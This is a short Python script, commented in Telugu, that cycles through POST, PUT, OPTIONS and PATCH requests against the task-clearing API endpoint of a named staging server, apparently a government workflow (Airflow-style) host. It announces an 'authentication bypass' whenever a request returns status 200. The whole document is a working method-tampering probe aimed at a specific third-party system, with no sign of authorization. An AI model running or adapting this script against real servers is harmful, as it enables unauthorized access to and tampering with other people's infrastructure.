import requests

# మనకు 405 వచ్చిన ఎండ్‌పాయింట్
url = "https://sm2a.staging.earth.gov/api/v1/dags/example/clearTaskInstances"

# రకరకాల మెథడ్స్ ని ట్రై చేద్దాం
methods = ['POST', 'PUT', 'OPTIONS', 'PATCH']

print(f"[*] Testing Method Injection on: {url}")

for m in methods:
    try:
        # ప్రతి మెథడ్ తో రిక్వెస్ట్ పంపుతున్నాం
        r = requests.request(m, url, timeout=10)
        print(f"[*] Method {m} -> Status: {r.status_code}")
        
        if r.status_code == 200:
            print(f"[+++] BOOM! Method {m} bypassed authentication!")
            print(r.text[:500])
        elif r.status_code == 400:
            print(f"[!] Alert: Method {m} allowed, but needs a body (Potential Bypass).")
            
    except Exception as e:
        print(f"[!] Error on {m}: {e}")

print("\n[*] Testing Complete.")
